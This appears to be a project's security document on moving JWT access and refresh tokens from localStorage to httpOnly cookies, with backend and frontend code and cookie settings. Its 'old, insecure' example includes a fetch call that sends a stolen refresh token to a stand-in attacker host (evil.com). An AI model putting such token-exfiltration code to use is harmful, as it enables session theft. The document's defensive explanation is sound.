# Security: Token Storage Implementation

## Overview

This document explains our secure token storage implementation following security best practices to protect against XSS (Cross-Site Scripting) attacks.

## 🔒 Token Storage Strategy

### **Both tokens stored in httpOnly cookies**

```
┌─────────────────────────────────────────────────┐
│  Access Token  → httpOnly, Secure, SameSite    │
│  Refresh Token → httpOnly, Secure, SameSite    │
└─────────────────────────────────────────────────┘
```

**Benefits:**
- ✅ Protected from XSS attacks (JavaScript cannot access)
- ✅ Automatically sent with requests
- ✅ Secure flag ensures HTTPS-only transmission
- ✅ SameSite flag provides CSRF protection

## 🛡️ Security Comparison

### ❌ **OLD (INSECURE) Implementation**

```javascript
// ❌ Vulnerable to XSS
localStorage.setItem('ft_refresh_token', refreshToken)

// Attacker's malicious script can steal it:
const stolen = localStorage.getItem('ft_refresh_token')
fetch('https://evil.com/steal', { body: stolen })
```

### ✅ **NEW (SECURE) Implementation**

```javascript
// ✅ Backend sets httpOnly cookie
reply.setCookie('refreshToken', refreshToken, {
  httpOnly: true,      // JavaScript cannot access
  secure: true,        // HTTPS only
  sameSite: 'strict',  // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
})

// Frontend cannot and should not access it
// Browser automatically sends it with requests
```

## 📋 Implementation Details

### **Backend Changes**

#### 1. **login.js** - Always set refresh token in httpOnly cookie

```javascript
// Generate tokens
const { accessToken, refreshToken } = generateTokenPair(user, {
  access: { expiresIn: '15m' },
  refresh: { expiresIn: rememberMe ? '7d' : '1d' }
})

// Set access token
reply.setCookie('accessToken', accessToken, ACCESS_TOKEN_CONFIG)

// Set refresh token (different maxAge based on rememberMe)
const refreshTokenCookieConfig = {
  ...REFRESH_TOKEN_CONFIG,
  maxAge: rememberMe ? 7 * 24 * 60 * 60 * 1000 : 24 * 60 * 60 * 1000
}
reply.setCookie('refreshToken', refreshToken, refreshTokenCookieConfig)

// ✅ NO refreshToken in response body
return {
  success: true,
  message: 'Login successful',
  user: { ... }
  // refreshToken: NOT HERE
}
```

#### 2. **2fa-verify.js** - Same pattern for 2FA login

```javascript
// Set both tokens in httpOnly cookies
reply.setCookie('accessToken', accessToken, ACCESS_TOKEN_CONFIG)
reply.setCookie('refreshToken', refreshToken, refreshTokenCookieConfig)

// ✅ NO refreshToken in response body
return {
  success: true,
  message: 'Login successful',
  user: { ... }
}
```

#### 3. **refresh.js** - Reads from cookie, sets new token in cookie

```javascript
// Backend reads from cookie automatically
const refreshToken = request.cookies.refreshToken

// Generate new tokens
const { accessToken, refreshToken: newRefreshToken } = ...

// Set new tokens in cookies
reply.setCookie('accessToken', accessToken, ACCESS_TOKEN_CONFIG)
if (newRefreshToken) {
  reply.setCookie('refreshToken', newRefreshToken, REFRESH_TOKEN_CONFIG)
}
```

### **Frontend Changes**

#### 1. **AuthService.ts** - Removed refresh token handling

```typescript
// ❌ OLD - Manual token management
if (loginData.refreshToken) {
  if (credentials.rememberMe) {
    localStorage.setItem('ft_refresh_token', loginData.refreshToken)
  } else {
    this.refreshToken = loginData.refreshToken
  }
}

// ✅ NEW - No manual handling needed
// Tokens are in httpOnly cookies, browser handles them automatically
public async login(credentials: LoginRequest): Promise<...> {
  const loginData = await executeLogin(credentials, '/auth/login')
  
  if (loginData.user) {
    this.storeUser(loginData.user) // Only store user data
  }
  
  return { success: true, user: loginData.user }
}
```

#### 2. **Token Refresh** - Simplified

```typescript
// ✅ NEW - Just call the endpoint, browser sends cookie
public async refreshAuthToken(): Promise<boolean> {
  try {
    // Refresh token in httpOnly cookie is automatically sent
    await executeRefreshToken('', '/auth/refresh')
    return true
  } catch (error) {
    this.clearStoredAuth()
    return false
  }
}
```

#### 3. **Auth Check** - No token check needed

```typescript
// ❌ OLD - Check both user and token
public isAuthenticated(): boolean {
  return !!this.getCurrentUser() && !!this.getRefreshToken()
}

// ✅ NEW - Only check user (token in httpOnly cookie)
public isAuthenticated(): boolean {
  return !!this.getCurrentUser()
}
```

## 🔐 Cookie Configuration

From `srcs/backend/src/utils/coockie.js`:

```javascript
const COOKIE_CONFIG = {
  httpOnly: true,              // ✅ Cannot be accessed by JavaScript
  secure: true,                // ✅ HTTPS only in production
  sameSite: 'strict',          // ✅ CSRF protection
  path: '/',                   // ✅ Available for all paths
  domain: '.yourdomain.com'    // ✅ Configure for production
}

export const ACCESS_TOKEN_CONFIG = {
  ...COOKIE_CONFIG,
  maxAge: 15 * 60 * 1000       // 15 minutes
}

export const REFRESH_TOKEN_CONFIG = {
  ...COOKIE_CONFIG,
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days (adjusted based on rememberMe)
}
```

## 🎯 "Remember Me" Feature

The `rememberMe` option now controls **cookie expiration**, not storage location:

| Remember Me | Access Token | Refresh Token |
|-------------|--------------|---------------|
| ✅ Checked  | 15 min       | 7 days        |
| ❌ Unchecked| 15 min       | 1 day         |

Both are **always** in httpOnly cookies.

## 🚀 Migration Notes

### For Existing Users

The code includes backwards compatibility cleanup:

```typescript
private clearStoredAuth(): void {
  localStorage.removeItem('ft_user')
  // Clean up old refresh tokens from localStorage
  localStorage.removeItem('ft_refresh_token')
  this.currentUser = null
}
```

Old refresh tokens in localStorage are automatically cleared on logout or auth refresh.

## 🧪 Testing

### Verify httpOnly Cookie is Set

1. Open DevTools → Application → Cookies
2. Login to the application
3. Check for `refreshToken` cookie
4. Verify flags: `HttpOnly`, `Secure`, `SameSite=Strict`

### Verify JavaScript Cannot Access

```javascript
// This should return empty string or undefined
console.log(document.cookie) // No refreshToken visible
```

### Verify Automatic Sending

1. Make authenticated API request
2. Check Network tab → Request Headers
3. Verify `Cookie: accessToken=...; refreshToken=...` is sent

## 📚 References

- [OWASP: HttpOnly Cookie Attribute](https://owasp.org/www-community/HttpOnly)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## ✅ Security Checklist

- [x] Both tokens stored in httpOnly cookies
- [x] Secure flag enabled (HTTPS only)
- [x] SameSite=strict for CSRF protection
- [x] No tokens in localStorage or sessionStorage
- [x] No tokens in response body
- [x] Automatic cookie cleanup on logout
- [x] Token expiration based on rememberMe preference
- [x] Frontend doesn't handle refresh token directly

---

**Last Updated:** October 3, 2025  
**Status:** ✅ Implemented and Secure
